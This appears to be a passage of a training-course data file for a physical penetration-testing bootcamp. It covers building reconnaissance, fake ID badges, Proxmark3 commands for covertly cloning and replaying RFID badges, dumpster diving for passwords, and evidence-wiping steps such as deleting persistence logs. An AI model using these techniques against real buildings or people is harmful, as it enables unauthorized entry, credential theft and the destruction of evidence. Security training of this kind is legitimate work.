                `To train like a hacker is to observe the 'Human Flow' of a building. Physical reconnaissance is the process of identifying entry points, guard patterns, and employee habits to find the moment of maximum vulnerability.

**The Operative's Recon Checklist:**
- **Entry Points:** Main lobbies, loading docks, fire exits, and smoking areas.
- **Guard Rotations:** When do shifts change? Is there a gap in surveillance?
- **Badging Culture:** Do employees challenge people without badges?
- **Device Exposure:** Are there public-facing network jacks in the lobby?

**Analyzing Physical Metadata:**
\`\`\`bash
# Identify the manufacturer of a security camera from its MAC address
# (Found via Wi-Fi sniffing in the lobby)
# MAC: 00:1A:E8 -> Manufacturer: Hikvision
\`\`\`

**Simulating a Badge Inspection:**
\`\`\`bash
# Create a high-resolution template for a fake HSociety employee ID
# Tools: Photoshop/GIMP (Graphic design skills are a hacker's asset)
\`\`\`

**Identifying Building Infrastructure:**
\`\`\`bash
# Search building permit records to find floor plans and server room locations
site:<gov_site> "HSociety Corp" "Floor Plan"
\`\`\`

**Interrogating Access Control Hardware:**
\`\`\`bash
# Identify the model of an RFID reader by searching its FCC ID
# (Usually printed on the bottom or back of the device)
site:<fcc_database_site> "HID Global"
\`\`\`

**Monitoring Environmental Signals:**
\`\`\`bash
# Sniff for Bluetooth devices in the lobby to identify employee phone types
hcitool scan
\`\`\`

**Visual Surveillance Drills:**
\`\`\`bash
# Use long-range optics to capture 'Shoulder Surfing' photos of employee badges
# (For recreating the badge layout and company logo)
\`\`\`

*Operative Drill:* You are sitting in the target's lobby. You see an employee walk in with two cups of coffee and a laptop bag. How do you use the **Reciprocity** or **Liking** principle to get them to hold the door for you?`,
              image: null,
            },
            {
              title: 'RFID Mastery & Badge Cloning',
              instruction:
                `Most modern offices use RFID badges for access. To become an HSociety operative, you must master the tools that allow you to read, clone, and replay these credentials. If you have the card's data, you have the building's keys.

**1. Identifying RFID Frequencies:**
- **Low Frequency (125 kHz):** HID Prox, Indala. (Older, easy to clone).
- **High Frequency (13.56 MHz):** MiFare, iClass, Desfire. (Newer, encrypted).

**2. Proxmark3: The Operative's Multi-Tool:**
\`\`\`bash
# Start the Proxmark3 client
pm3

# Read an HID Prox (125kHz) card data
lf hid read

# Clone the captured data to a blank card (T5577)
lf hid clone --raw 2006f1a23b
\`\`\`

**3. Advanced HF Manipulation:**
\`\`\`bash
# Perform a 'Snoop' attack to capture the handshake between card and reader
hf mf snoop

# Attempt to crack a MiFare Classic 1K card using the 'DarkSide' attack
hf mf hardnested --key a --num 0 --target f
\`\`\`

**4. Long-Range RFID Harvesting:**
Operatives use 'High-Gain' antennas hidden in bags to read cards from several feet away.
\`\`\`bash
# Run a continuous read loop in a crowded hallway
pm3 -c "lf hid watch"
\`\`\`

**5. Simulating a 'Replay' Attack:**
\`\`\`bash
# Simulate a captured credential against a reader without a physical card
pm3 -c "lf hid sim --raw 2006f1a23b"
\`\`\`

**6. Badge Data Analysis:**
\`\`\`bash
# Identify the 'Facility Code' and 'Card Number' from raw bits
# Raw: 2006f1a23b -> FC: 120, CN: 4567
\`\`\`

*Hacker's Strategy:* The best time to clone a badge is in a crowded elevator or a coffee shop line. A Proxmark3 hidden in a laptop sleeve can capture a 'Read' in less than a second.`,
              image: null,
            },
            {
              title: 'Dumpster Diving & Data Reconstruction',
              instruction:
                `One person's trash is an HSociety operative's treasure. Dumpster diving provides a wealth of OSINT and technical data that can be used to build a pretext, find credentials, or map internal systems. Information is only 'deleted' when it is destroyed.

**High-Value Trash Targets:**
- **Unshredded Documents:** Org charts, meeting notes, project plans.
- **Internal Directories:** Phone lists, room numbers, department codes.
- **Hardware Waste:** Discarded hard drives, USBs, and routers.
- **Technical Manuals:** Reveal specific hardware models and versions.

**1. Reconstructing Shredded Evidence:**
Operatives use software to scan and 'un-shred' documents that were only strip-shredded.

**2. Extracting Data from 'Dead' Hardware:**
\`\`\`bash
# Mount a recovered drive and search for 'confidential' files
mount /dev/sdb1 /mnt/trash_drive
grep -r "password" /mnt/trash_drive
\`\`\`

**3. Recovering Deleted Files (Forensics):**
\`\`\`bash
# Use 'photorec' to recover deleted images or docs from a discarded SD card
sudo photorec /dev/sdb
\`\`\`

**4. Interrogating Recovered Configs:**
\`\`\`bash
# Extract the configuration from a discarded router to find target IPs
cat config.bak | grep "interface" -A 5
\`\`\`

**5. Building a 'Human Profile' from Trash:**
Identify employee names and birthdays from discarded 'Happy Birthday' cards or cake boxes—perfect for password guessing.

**6. Analyzing Post-it Note Residue:**
Checking discarded monitors or keyboards for the 'imprint' of a password written on a sticky note.

*Operative Drill:* You find a discarded network diagram that was only torn in half. What is the first thing you look for on that diagram to help your **Phase 3 (Networking)** engagement?`,
              image: null,
            },
            {
              title: 'OPSEC for Physical Engagements',
              instruction:
                `In a physical engagement, your most important tool is your mind. If you are caught, no command line can save you. To train like a hacker is to master the 'Invisible Presence,' blending into the environment so perfectly that you are forgotten the moment you leave the room.

**1. Managing Your 'Story' (OPSEC):**
- **The Uniform:** Wear what they wear. (Business casual, high-vis vest, or generic IT t-shirt).
- **The Prop:** Carry a clipboard, a ladder, or a box of donuts.
- **The Exit Strategy:** Know where the stairs are before you enter the floor.

**2. Digital OPSEC in the Field:**
\`\`\`bash
# Disable Wi-Fi and Bluetooth on your own devices to avoid being tracked
sudo rfkill block all

# Ensure your 'Physical Toolkit' (Proxmark, Rubber Ducky) is encrypted
# (Protecting your own tools from counter-forensics!)
\`\`\`

**3. Cleaning Your Physical Trail:**
- **No Fingerprints:** Wear thin gloves or use generic surfaces.
- **No Visuals:** Avoid looking directly at cameras.
- **No Evidence:** Never leave your own trash or notes behind.

**4. Implementing the 'Authorisation' Buffer:**
Always carry a 'Get Out of Jail Free' card—the signed authorization letter from the HSociety client. If challenged, stay calm and present the letter.

**5. Post-Engagement Sanitization:**
\`\`\`bash
# Wipe the logs of any 'Drop-Box' you left behind on the network
rm -rf /var/log/hsociety_persistence.log

# Overwrite free space on your field laptop
dd if=/dev/zero of=/tmp/wipe.tmp bs=1M; rm /tmp/wipe.tmp
\`\`\`

**6. Tactical Communication:**
Use silent signals or coded messages with your team if they are monitoring your 'Body-Cam' or audio feed.

*Final Training Insight:* Physical security is the bridge between the digital and the real world. By mastering these techniques, you have become a 'Full-Stack Operative,' capable of compromising a target from the sidewalk to the database. Congratulations on completing the Hacker Protocol Bootcamp.`,
              image: null,
            },
          ],
        },
      ],
    },

  ],
};
